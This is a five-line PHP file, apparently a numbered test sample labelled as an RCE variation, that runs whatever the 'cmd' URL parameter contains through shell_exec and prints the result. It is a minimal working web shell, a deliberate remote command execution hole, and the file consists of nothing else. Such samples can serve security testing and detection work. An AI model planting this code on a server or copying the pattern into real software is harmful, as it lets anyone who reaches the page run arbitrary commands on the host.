<?php
// RCE test variation #210
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>